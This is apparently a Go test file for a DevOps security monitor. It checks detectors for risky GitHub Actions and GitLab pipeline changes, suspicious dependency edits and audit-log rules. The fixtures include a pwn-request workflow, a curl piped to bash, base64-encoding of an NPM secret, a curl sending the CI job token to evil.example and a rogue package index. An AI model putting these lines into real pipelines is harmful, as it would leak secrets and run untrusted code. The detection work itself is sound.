package api

import (
	"encoding/json"
	"strings"
	"testing"
	"time"

	"obsidianwatch/management/internal/store"
)

func TestPipelineRisks(t *testing.T) {
	patch := `+on: pull_request_target
+jobs:
+  build:
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.sha }}
+      - run: echo "${{ github.event.pull_request.title }}"
+      - uses: some-org/deploy-action@main
+      - uses: other/thing@0123456789abcdef0123456789abcdef01234567
+      - run: curl -s https://x.sh | bash
+      - run: echo ${{ secrets.NPM_TOKEN }} | base64
`
	r := pipelineRisks(patch)
	for _, want := range []string{"pull_request_target trigger", "checks out pull request head code", "untrusted event data interpolated into a step",
		"third-party action not pinned to a commit SHA", "download piped to a shell", "prints, dumps or encodes secrets"} {
		if !strings.Contains(strings.Join(r, "|"), want) {
			t.Errorf("missing %q in %v", want, r)
		}
	}
	if pipelineRiskSeverity(r) != 5 {
		t.Fatal("pwn-request pattern must be critical")
	}
	benign := "+on: push\n+      - uses: actions/setup-go@v5\n+      - run: go test ./...\n"
	if len(pipelineRisks(benign)) != 0 {
		t.Fatalf("benign: %v", pipelineRisks(benign))
	}
	if r := pipelineRisks("+script:\n+  - curl -H \"JOB-TOKEN: $CI_JOB_TOKEN\" https://evil.example/x\n"); len(r) != 1 || r[0] != "sends the CI token to a URL" {
		t.Fatalf("gitlab token: %v", r)
	}
}

func TestDependencyRisks(t *testing.T) {
	if r := dependencyRisks("package.json", "+  \"scripts\": {\n+    \"postinstall\": \"node x.js\"\n"); len(r) != 1 {
		t.Fatalf("install script: %v", r)
	}
	if r := dependencyRisks("requirements.txt", "+--extra-index-url https://pypi.evil.example/simple\n+requests==2.31.0\n"); len(r) != 1 {
		t.Fatalf("extra index: %v", r)
	}
	if r := dependencyRisks("package.json", "+    \"lib\": \"git+https://github.com/x/y.git\"\n"); len(r) != 1 {
		t.Fatalf("git dep: %v", r)
	}
	if r := dependencyRisks("go.mod", "+replace github.com/a/b => ../b\n"); len(r) != 1 {
		t.Fatalf("replace: %v", r)
	}
	if r := dependencyRisks("package-lock.json", "+      \"version\": \"4.17.21\",\n"); len(r) != 0 {
		t.Fatalf("version bump must not alert: %v", r)
	}
}

func devEvent(typ string, raw interface{}) store.Event {
	b, _ := json.Marshal(raw)
	return store.Event{EventType: typ, OS: "devops", Raw: b, Time: time.Date(2026, 11, 25, 14, 0, 0, 0, time.UTC)}
}

func TestNewDevOpsRules(t *testing.T) {
	conn := &store.DevOpsConnector{ID: 4, Org: "acme"}
	var entries []map[string]interface{}
	for i := 0; i < 20; i++ {
		entries = append(entries, map[string]interface{}{"action": "git.clone", "actor": "eve", "repo": "acme/r" + string(rune('a'+i)), "actor_ip": "203.0.113.9", "created_at": float64(1764079200000 + i)})
		entries = append(entries, map[string]interface{}{"action": "git.clone", "actor": "ci-bot[bot]", "repo": "acme/r" + string(rune('a'+i))})
	}
	entries = append(entries, map[string]interface{}{"action": "git.clone", "actor": "bob", "repo": "acme/one"})
	sums := cloneSummaries(entries, conn)
	fired := map[string]bool{}
	for _, c := range sums {
		if devSig(t, "DEV-028").Match(ceToEvent(c)) {
			fired[c.Username] = true
		}
	}
	if !fired["eve"] || fired["ci-bot[bot]"] || fired["bob"] || len(sums) != 3 {
		t.Fatalf("mass clone: %v (%d summaries)", fired, len(sums))
	}

	ev := processGitHubWebhookEvent("secret_scanning_alert", map[string]interface{}{"action": "created",
		"alert": map[string]interface{}{"push_protection_bypassed": true, "secret_type": "github_personal_access_token"}}, conn)
	if !devSig(t, "DEV-024").Match(ceToEvent(ev[0])) {
		t.Fatal("push protection bypass")
	}
	sa := processGitHubWebhookEvent("security_and_analysis", map[string]interface{}{
		"changes":    map[string]interface{}{"from": map[string]interface{}{"security_and_analysis": map[string]interface{}{"secret_scanning": map[string]interface{}{"status": "enabled"}}}},
		"repository": map[string]interface{}{"full_name": "acme/x", "security_and_analysis": map[string]interface{}{"secret_scanning": map[string]interface{}{"status": "disabled"}}},
	}, conn)
	if !devSig(t, "DEV-025").Match(ceToEvent(sa[0])) {
		t.Fatalf("security feature disabled: %+v", sa)
	}
	if !devSig(t, "DEV-026").Match(devEvent("devops.repo_update_actions_secret", map[string]string{"action": "repo.update_actions_secret"})) {
		t.Fatal("actions secret")
	}
	ado := adoAuditToEvents([]map[string]interface{}{{"id": "9", "actionId": "Git.RefUpdatePoliciesBypassed"}}, conn)
	if len(ado) != 1 || !devSig(t, "DEV-027").Match(ceToEvent(ado[0])) || devSig(t, "DEV-022").Match(ceToEvent(ado[0])) {
		t.Fatalf("ado bypass: %+v", ado)
	}
	if !devSig(t, "DEV-031").Match(devEvent("devops.hook_destroy", map[string]string{"action": "hook.destroy"})) {
		t.Fatal("webhook removed")
	}
}

func TestNoisyRulesTightened(t *testing.T) {
	risky := devEvent("devops.cicd_modified", map[string]string{"risky": "self-hosted runner"})
	plain := devEvent("devops.cicd_modified", map[string]string{"risky": ""})
	if devSig(t, "DEV-003").Match(risky) || !devSig(t, "DEV-003").Match(plain) || !devSig(t, "DEV-023").Match(risky) || devSig(t, "DEV-023").Match(plain) {
		t.Fatal("DEV-003 / DEV-023 split")
	}
	night := devEvent("devops.push", map[string]string{"message": "publicized the docs", "event": "push"})
	night.Time = time.Date(2026, 11, 25, 2, 0, 0, 0, time.UTC)
	if devSig(t, "DEV-017").Match(night) {
		t.Fatal("DEV-017 must not fire on a commit message")
	}
	dom := devEvent("devops.audit", map[string]string{"action": "repo.rename", "repo": "acme/domain-service"})
	if devSig(t, "DEV-014").Match(dom) {
		t.Fatal("DEV-014 must not fire on a repository name")
	}
	if devSig(t, "DEV-020").Match(devEvent("devops.dependency_change", map[string]interface{}{"files": []string{"package-lock.json"}})) {
		t.Fatal("plain dependency change must not alert")
	}
	if !devSig(t, "DEV-020").Match(devEvent("devops.dependency_change", map[string]interface{}{"risks": []string{"package.json: adds an install script"}})) {
		t.Fatal("risky dependency change must alert")
	}
}
